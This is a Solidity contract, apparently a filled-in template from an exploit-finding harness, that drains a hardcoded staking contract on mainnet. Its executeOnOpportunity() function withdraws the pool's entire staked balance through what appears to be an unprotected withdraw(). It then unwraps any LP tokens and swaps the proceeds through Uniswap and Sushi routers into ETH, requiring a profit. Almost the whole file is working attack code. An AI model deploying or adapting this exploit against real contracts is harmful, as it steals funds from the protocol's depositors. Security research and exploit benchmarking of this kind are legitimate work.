// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title FlawVerifier
 * @notice Implement your exploit in the executeOnOpportunity() function
 * @dev This contract will be funded with 1,000,000 native tokens before execution
 */

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IUniswapV2Router {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    
    function getAmountsOut(uint amountIn, address[] calldata path) 
        external view returns (uint[] memory amounts);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function sync() external;
    function burn(address to) external returns (uint256 amount0, uint256 amount1);
}

interface IWETH {
    function deposit() external payable;
    function withdraw(uint) external;
}

interface IUniswapV3Router {
    struct ExactInputParams {
        bytes path;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
    }

    function exactInput(ExactInputParams calldata params) external payable returns (uint256 amountOut);
}

interface IStakingRewardsLike {
    function stakingToken() external view returns (address);
    function withdraw(uint256 amount) external;
}

contract FlawVerifier {
    address constant TARGET = 0xB3FB1D01B07A706736Ca175f827e4F56021b85dE;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;

    address constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address constant SUSHI_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
    address constant SUSHI_ROUTER = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;

    constructor() {}
    
    /**
     * @dev Main exploit function - IMPLEMENT YOUR EXPLOIT HERE
     * @dev This is called by the deployment script after funding with 1M native tokens
     * @dev Final balance must be >= initial + 0.1 native tokens
     * 
     * CONSTRAINTS:
     * - NO cheatcodes (vm.*) - they won't work in deployment
     * - Convert all profits to native token (ETH/BNB) before returning
     * - Handle fee-on-transfer tokens correctly
     */
    function executeOnOpportunity() external {
        uint256 initialBalance = address(this).balance;
        address staking = IStakingRewardsLike(TARGET).stakingToken();

        uint256 poolBal = IERC20(staking).balanceOf(TARGET);
        require(poolBal != 0, "nothing to drain");

        IStakingRewardsLike(TARGET).withdraw(poolBal);

        uint256 drained = IERC20(staking).balanceOf(address(this));
        require(drained != 0, "drain failed");

        if (staking == WETH) {
            IWETH(WETH).withdraw(drained);
        } else {
            _tryUnwrapV2LP(staking);
            _approveIfNeeded(staking, UNISWAP_V2_ROUTER);
            _approveIfNeeded(staking, SUSHI_ROUTER);

            _liquidateToken(staking);
            _liquidateToken(USDC);
            _liquidateToken(USDT);
            _liquidateToken(DAI);
            _liquidateToken(WBTC);

            // If staking token was LP, burn can produce arbitrary token0/token1.
            _tryUnwrapV2LP(staking);
            _liquidateUnknownPairToken(staking);

            uint256 wethBal = IERC20(WETH).balanceOf(address(this));
            if (wethBal != 0) {
                IWETH(WETH).withdraw(wethBal);
            }
        }

        require(address(this).balance >= initialBalance + 0.1 ether, "Insufficient profit");
    }

    function _liquidateUnknownPairToken(address maybePair) internal {
        (address token0, address token1, bool ok) = _getPairTokens(maybePair);
        if (!ok) return;
        _approveIfNeeded(token0, UNISWAP_V2_ROUTER);
        _approveIfNeeded(token0, SUSHI_ROUTER);
        _approveIfNeeded(token1, UNISWAP_V2_ROUTER);
        _approveIfNeeded(token1, SUSHI_ROUTER);
        _liquidateToken(token0);
        _liquidateToken(token1);
    }

    function _liquidateToken(address tokenIn) internal {
        uint256 bal = IERC20(tokenIn).balanceOf(address(this));
        if (bal == 0) return;
        if (tokenIn == WETH) {
            IWETH(WETH).withdraw(bal);
            return;
        }

        _approveIfNeeded(tokenIn, UNISWAP_V2_ROUTER);
        _approveIfNeeded(tokenIn, SUSHI_ROUTER);

        _tryAllRoutes(UNISWAP_V2_ROUTER, UNISWAP_V2_FACTORY, tokenIn);
        _tryAllRoutes(SUSHI_ROUTER, SUSHI_FACTORY, tokenIn);

        uint256 wethBal = IERC20(WETH).balanceOf(address(this));
        if (wethBal != 0) {
            IWETH(WETH).withdraw(wethBal);
        }
    }

    function _approveIfNeeded(address token, address spender) internal {
        IERC20(token).approve(spender, type(uint256).max);
    }

    function _tryUnwrapV2LP(address token) internal {
        uint256 lpBal = IERC20(token).balanceOf(address(this));
        if (lpBal == 0) return;

        (address token0, address token1, bool ok) = _getPairTokens(token);
        if (!ok || token0 == address(0) || token1 == address(0)) return;
        address uniPair = IUniswapV2Factory(UNISWAP_V2_FACTORY).getPair(token0, token1);
        address sushiPair = IUniswapV2Factory(SUSHI_FACTORY).getPair(token0, token1);
        if (uniPair != token && sushiPair != token) return;

        try IERC20(token).transfer(token, lpBal) returns (bool transferred) {
            if (!transferred) return;
        } catch {
            return;
        }

        try IUniswapV2Pair(token).burn(address(this)) returns (uint256, uint256) {} catch {}
    }

    function _getPairTokens(address pair) internal view returns (address token0, address token1, bool ok) {
        if (pair.code.length == 0) return (address(0), address(0), false);
        try IUniswapV2Pair(pair).token0() returns (address t0) {
            token0 = t0;
        } catch {
            return (address(0), address(0), false);
        }
        try IUniswapV2Pair(pair).token1() returns (address t1) {
            token1 = t1;
        } catch {
            return (address(0), address(0), false);
        }
        ok = true;
    }

    function _tryAllRoutes(address router, address factory, address tokenIn) internal {
        uint256 bal = IERC20(tokenIn).balanceOf(address(this));
        if (bal == 0 || tokenIn == WETH) return;

        _trySwap2(router, factory, tokenIn, WETH);
        _trySwap3(router, factory, tokenIn, USDC, WETH);
        _trySwap3(router, factory, tokenIn, USDT, WETH);
        _trySwap3(router, factory, tokenIn, DAI, WETH);
        _trySwap3(router, factory, tokenIn, WBTC, WETH);
        _trySwap4(router, factory, tokenIn, WBTC, USDC, WETH);
        _trySwap4(router, factory, tokenIn, WBTC, USDT, WETH);
        _trySwap4(router, factory, tokenIn, WBTC, DAI, WETH);
    }

    function _trySwap2(address router, address factory, address a, address b) internal {
        if (a == b) return;
        uint256 amountIn = IERC20(a).balanceOf(address(this));
        if (amountIn == 0) return;

        address[] memory path = new address[](2);
        path[0] = a;
        path[1] = b;
        _trySwap(router, factory, amountIn, path);
    }

    function _trySwap3(address router, address factory, address a, address b, address c) internal {
        if (a == b || b == c || a == c) return;
        uint256 amountIn = IERC20(a).balanceOf(address(this));
        if (amountIn == 0) return;

        address[] memory path = new address[](3);
        path[0] = a;
        path[1] = b;
        path[2] = c;
        _trySwap(router, factory, amountIn, path);
    }

    function _trySwap4(address router, address factory, address a, address b, address c, address d) internal {
        if (a == b || a == c || a == d || b == c || b == d || c == d) return;
        uint256 amountIn = IERC20(a).balanceOf(address(this));
        if (amountIn == 0) return;

        address[] memory path = new address[](4);
        path[0] = a;
        path[1] = b;
        path[2] = c;
        path[3] = d;
        _trySwap(router, factory, amountIn, path);
    }

    function _allPairsExist(address factory, address[] memory path) internal view returns (bool) {
        for (uint256 i = 0; i + 1 < path.length; i++) {
            address pair = IUniswapV2Factory(factory).getPair(path[i], path[i + 1]);
            if (pair == address(0) || pair.code.length == 0) return false;
        }
        return true;
    }

    function _trySwap(address router, address factory, uint256 amountIn, address[] memory path) internal {
        if (!_allPairsExist(factory, path)) return;
        try IUniswapV2Router(router).getAmountsOut(amountIn, path) returns (uint[] memory amounts) {
            if (amounts[amounts.length - 1] == 0) return;
            try IUniswapV2Router(router).swapExactTokensForTokensSupportingFeeOnTransferTokens(
                amountIn,
                0,
                path,
                address(this),
                block.timestamp
            ) {} catch {}
        } catch {}
    }
    
    // Helper function to receive native tokens
    receive() external payable {}
    
    // Fallback function
    fallback() external payable {}
}
